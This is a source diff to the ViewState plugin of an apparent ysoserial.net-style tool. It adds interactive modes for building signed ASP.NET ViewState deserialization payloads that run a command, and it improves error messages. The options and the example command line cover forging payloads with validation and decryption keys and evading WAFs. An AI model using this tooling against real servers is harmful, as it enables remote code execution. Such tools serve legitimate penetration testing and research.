@@ -25,7 +25,7 @@ using ysonet.Helpers;
 
 namespace ysonet.Plugins
 {
-    public class ViewStatePlugin : IPlugin
+    public class ViewStatePlugin : IPlugin, IPluginModes
     {
         static bool showExamples = false;
         static bool showraw = false;
@@ -76,7 +76,7 @@ namespace ysonet.Plugins
             {"vsg|generator=", "The __VIEWSTATEGENERATOR value in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v },
             {"path=", "The target web page (optional; only used to compute the __VIEWSTATEGENERATOR when 'generator' is not given). Example: /app/folder1/page.aspx.", v => targetPagePath = v },
             {"pathisclass", "Indicates that the path is a class name and should not be modified.", v => pathIsClassName = v != null },
-            {"apppath=", "The application path. Needed to simulate TemplateSourceDirectory.", v => IISAppInPathOrVirtualDir = v },
+            {"apppath=", "The IIS application path (optional; used to simulate TemplateSourceDirectory). Example: /myapp/. Leave empty for the site root.", v => IISAppInPathOrVirtualDir = v },
             {"islegacy", "Use the legacy algorithm suitable for .NET 4.0 and below.", v => isLegacy = v != null },
             {"isencrypted", "Use when the legacy algorithm is used to bypass WAFs.", v => isEncrypted = v != null },
             {"vsuk|VSUK|viewstateuserkey=|ViewStateUserKey=", "Sets the ViewStateUserKey parameter, sometimes used as the anti-CSRF token.", v => viewStateUserKey = v },
@@ -88,7 +88,7 @@ namespace ysonet.Plugins
             {"showraw", "Stop URL-encoding the result. Default: false.", v => showraw = v != null },
             {"minify", "Minify the payloads where applicable (experimental). Default: false.", v => minify = v != null },
             {"ust|usesimpletype", "Remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true.", v => useSimpleType = v != null },
-            {"osf|objectstateformatter", "This is to smiluate ObjectStateFormatter with a MAC encoding key on its own.", v => isOSF = v != null },
+            {"osf|objectstateformatter", "This is to simulate ObjectStateFormatter with a MAC encoding key on its own.", v => isOSF = v != null },
             {"mk|mackey=", "The ObjectStateFormatter MAC encoding key in base64. Only used with the 'osf' option.", v => macEncodingKey = v },
             {"isdebug", "Show useful debugging messages.", v => isDebug = v != null },
         };
@@ -111,6 +111,53 @@ namespace ysonet.Plugins
         public OptionSet Options()
         {
             return options;
+        }
+
+        // Interactive-only mode descriptions (see IPluginModes). These do not affect
+        // the CLI: each mode just picks which of the same options the interactive
+        // editor shows and passes. The 'legacy'/'osf'/encryption switches stay
+        // available in every mode as normal settings.
+        public List<PluginMode> InteractiveModes()
+        {
+            // Shared settings offered in every mode.
+            string[] common = new string[] {
+                "validationkey", "validationalg", "path", "apppath", "pathisclass",
+                "generator", "islegacy", "isencrypted", "decryptionkey", "decryptionalg",
+                "viewstateuserkey", "objectstateformatter", "mackey", "currentviewstate",
+                "showraw", "minify", "usesimpletype"
+            };
+            return new List<PluginMode>
+            {
+                new PluginMode {
+                    Name = "Exploit (gadget runs a command)",
+                    Description = "Build and sign a gadget payload. Needs a command and a validationkey.",
+                    Options = Merge(new string[] { "gadget", "command", "rawcmd" }, common),
+                    Required = new string[] { "command", "validationkey" },
+                    Preset = new Dictionary<string, string> { { "dryrun", "" } },
+                },
+                new PluginMode {
+                    Name = "Dry run (valid ViewState, no exploit)",
+                    Description = "A signed but harmless ViewState. Needs only a validationkey.",
+                    Options = common,
+                    Required = new string[] { "validationkey" },
+                    Preset = new Dictionary<string, string> { { "dryrun", "true" } },
+                },
+                new PluginMode {
+                    Name = "Unsigned payload (sign an existing one)",
+                    Description = "Sign a base64 LosFormatter payload you already have.",
+                    Options = Merge(new string[] { "unsignedpayload", "isfileusp" }, common),
+                    Required = new string[] { "unsignedpayload", "validationkey" },
+                    Preset = new Dictionary<string, string> { { "dryrun", "" } },
+                },
+            };
+        }
+
+        private static string[] Merge(string[] head, string[] tail)
+        {
+            var list = new List<string>();
+            list.AddRange(head);
+            list.AddRange(tail);
+            return list.ToArray();
         }
 
         public object Run(string[] args)
@@ -145,16 +192,22 @@ namespace ysonet.Plugins
             {
                 Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                 ShowExamples();
-                System.Environment.Exit(-1);
+                // Throw instead of Environment.Exit: exiting the process here would
+                // kill the whole tool (and, in interactive mode, the whole session)
+                // with no visible message. Throwing is caught by the caller.
+                throw new Exception("The 'examples' option only prints usage examples; it does not generate a payload. Turn it off to build a ViewState.");
             }
 
             if (String.IsNullOrEmpty(command) && !dryRun && !cmdstdin && String.IsNullOrEmpty(unsignedPayload))
             {
+                string msg = "ViewState needs a payload source. Do one of: set a 'command' (the gadget runs it; "
+                    + "for ActivitySurrogateSelector any placeholder works), or turn on 'dryrun' (a valid ViewState "
+                    + "with no exploit), or provide an 'unsignedpayload'. A 'validationkey' is also required.";
                 Console.Write("ysonet: ");
-                Console.WriteLine("Incorrect plugin mode/arguments combination");
+                Console.WriteLine(msg);
                 Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                 ShowExamples();
-                throw new Exception("Incorrect plugin mode/arguments combination");
+                throw new Exception(msg);
             }
 
             var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
@@ -740,7 +793,7 @@ namespace ysonet.Plugins
 .\ysonet.exe -p ViewState -c ""foo to use ActivitySurrogateSelector"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --islegacy --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --isencrypted --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""
 ";
 
-            Console.WriteLine("Exmaples:");
+            Console.WriteLine("Examples:");
             Console.WriteLine(examples);
         }
     }
